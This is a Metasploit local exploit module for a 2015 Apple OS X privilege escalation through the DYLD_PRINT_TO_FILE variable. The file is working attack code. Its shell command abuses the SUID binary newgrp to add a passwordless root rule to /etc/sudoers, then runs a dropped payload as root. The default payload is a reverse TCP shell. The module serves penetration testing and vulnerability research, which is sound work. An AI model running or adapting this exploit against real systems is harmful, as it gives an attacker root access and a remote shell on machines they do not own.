##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Local

  Rank = GreatRanking

  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apple OS X DYLD_PRINT_TO_FILE Privilege Escalation',
      'Description'    => %q{
        In Apple OS X 10.10.4 and prior, the DYLD_PRINT_TO_FILE environment
        variable is used for redirecting logging data to a file instead of
        stderr. Due to a design error, this feature can be abused by a local
        attacker to write arbitrary files as root via restricted, SUID-root
        binaries.
      },
      'Author'         => [
        'Stefan Esser', # Vulnerability discovery and PoC
        'joev'          # Copy/paste monkey
      ],
      'References'     => [
        ['URL', 'https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html'],
        ['URL', 'https://www.reddit.com/r/netsec/comments/3e34i2/os_x_1010_dyld_print_to_file_local_privilege/']
      ],
      'DisclosureDate' => 'Jul 21 2015',
      'License'        => MSF_LICENSE,
      'Platform'       => 'osx',
      'Arch'           => ARCH_X86_64,
      'SessionTypes'   => ['shell'],
      'Privileged'     => true,
      'Targets'        => [
        ['Mac OS X 10.10-10.10.4', {}]
      ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
        'PAYLOAD'         => 'osx/x64/shell_reverse_tcp'
      }
    ))

    register_options([
      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])
    ])
  end

  def exploit
    print_status("Writing payload to `#{payload_file}'")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)
    cmd_exec("chmod +x #{payload_file}")

    print_status("Executing exploit at `#{payload_file}'...")
    cmd_exec(sploit)
  end

  def check
    (ver?) ? Exploit::CheckCode::Appears : Exploit::CheckCode::Safe
  end

  def ver?
    Gem::Version.new(get_sysinfo['ProductVersion']).between?(
      Gem::Version.new('10.10.0'), Gem::Version.new('10.10.4')
    )
  end

  def sploit
    %Q{/bin/sh -c "echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo #{payload_file} &"}
  end

  def binary_payload
    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
  end

  def payload_file
    @payload_file ||=
      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(8)}"
  end

end
